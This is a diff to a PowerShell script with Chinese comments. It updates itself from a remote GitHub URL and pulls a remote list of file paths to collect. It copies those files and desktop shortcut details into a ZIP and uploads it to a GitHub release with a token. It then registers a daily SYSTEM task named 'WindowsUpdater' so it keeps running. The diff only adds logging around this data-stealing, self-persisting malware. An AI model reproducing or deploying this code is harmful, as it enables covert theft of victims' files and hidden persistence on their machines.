@@ -1,15 +1,26 @@
-# Save self to local file path for scheduled task
+# === STEP 0: 安全尝试自我更新 ===
 $localPath = "C:\ProgramData\Microsoft\Windows\update.ps1"
-Invoke-RestMethod -Uri "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/install.ps1" -OutFile $localPath -UseBasicParsing
+$remoteUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/install.ps1"
 
-# Set UTF-8 encoding
 [Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 $OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 
-# Read GitHub token from environment variable
+try {
+    $scriptContent = Invoke-RestMethod -Uri $remoteUrl -UseBasicParsing -ErrorAction Stop
+    if ($scriptContent -and $scriptContent.Length -gt 0) {
+        $scriptContent | Out-File -FilePath $localPath -Encoding utf8
+        Write-Host "✅ Local script updated from GitHub"
+    } else {
+        Write-Warning "⚠️ Remote script is empty. Keeping existing version."
+    }
+} catch {
+    Write-Warning "⚠️ Failed to update local script from GitHub. Using existing version."
+}
+
+# === STEP 1: 初始化参数 ===
 $token = $env:GH_UPLOAD_KEY
 if (-not $token) {
-    Write-Error "环境变量 GH_UPLOAD_KEY 未设置，无法上传文件到 GitHub"
+    Write-Error "❌ 环境变量 GH_UPLOAD_KEY 未设置，无法上传文件到 GitHub"
     return
 }
 
@@ -25,22 +36,22 @@ $zipName = "package-$computerName-$timestamp.zip"
 $zipPath = Join-Path $env:TEMP $zipName
 New-Item -ItemType Directory -Path $tempRoot -Force -ErrorAction SilentlyContinue | Out-Null
 
-# STEP 1: Load file path list from remote .txt
+# === STEP 2: 拉取远程路径列表 ===
 $remoteTxtUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/upload-target.txt"
 try {
     $remoteList = Invoke-RestMethod -Uri $remoteTxtUrl -UseBasicParsing -ErrorAction Stop
     $pathList = $remoteList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
 } catch {
+    Write-Warning "⚠️ 无法获取远程路径列表"
     return
 }
 
+# === STEP 3: 复制路径到临时目录 ===
 $index = 0
 foreach ($path in $pathList) {
     $index++
     $name = "item$index"
-
     if (-not (Test-Path $path)) { continue }
-
     $dest = Join-Path $tempRoot $name
 
     try {
@@ -55,7 +66,7 @@ foreach ($path in $pathList) {
     } catch {}
 }
 
-# STEP 2: Extract .lnk shortcut info from Desktop
+# === STEP 4: 提取桌面 .lnk 快捷方式信息 ===
 try {
     $desktop = [Environment]::GetFolderPath("Desktop")
     $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk
@@ -64,7 +75,6 @@ try {
 
     foreach ($lnk in $lnkFiles) {
         $shortcut = $shell.CreateShortcut($lnk.FullName)
-
         $lnkReport += "[$($lnk.Name)]`n"
         $lnkReport += "TargetPath: $($shortcut.TargetPath)`n"
         $lnkReport += "Arguments:  $($shortcut.Arguments)`n"
@@ -77,14 +87,15 @@ try {
     $lnkReport | Out-File -FilePath $lnkOutputFile -Encoding utf8
 } catch {}
 
-# STEP 3: Archive
+# === STEP 5: 压缩文件为 ZIP ===
 try {
     Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force -ErrorAction Stop
 } catch {
+    Write-Warning "❌ 压缩失败"
     return
 }
 
-# STEP 4: Upload to GitHub
+# === STEP 6: 创建 GitHub Release 并上传 ZIP ===
 $releaseData = @{
     tag_name = $tag
     name = $releaseName
@@ -103,6 +114,7 @@ try {
     $releaseResponse = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData -ErrorAction Stop
     $uploadUrl = $releaseResponse.upload_url -replace "{.*}", "?name=$zipName"
 } catch {
+    Write-Warning "❌ 创建 Release 失败"
     return
 }
 
@@ -113,14 +125,17 @@ try {
         "Content-Type" = "application/zip"
         "User-Agent" = "PowerShellScript"
     }
-    $response = Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes -ErrorAction Stop
-} catch {}
+    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes -ErrorAction Stop
+    Write-Host "✅ ZIP 上传成功"
+} catch {
+    Write-Warning "❌ ZIP 上传失败"
+}
 
-# STEP 5: Cleanup
+# === STEP 7: 清理临时文件 ===
 Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
 
-# STEP 6: Register daily task at 2:00 AM to run the update.ps1 script
+# === STEP 8: 注册计划任务（SYSTEM，每天 2:00 AM）===
 $taskName = "WindowsUpdater"
 $taskDescription = "Daily file package task"
 $scriptPath = "C:\\ProgramData\\Microsoft\\Windows\\update.ps1"
@@ -135,4 +150,7 @@ try {
     $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description $taskDescription -Principal $principal
-} catch {}
+    Write-Host "📅 计划任务 [$taskName] 已注册"
+} catch {
+    Write-Warning "⚠️ 注册计划任务失败：$($_.Exception.Message)"
+}
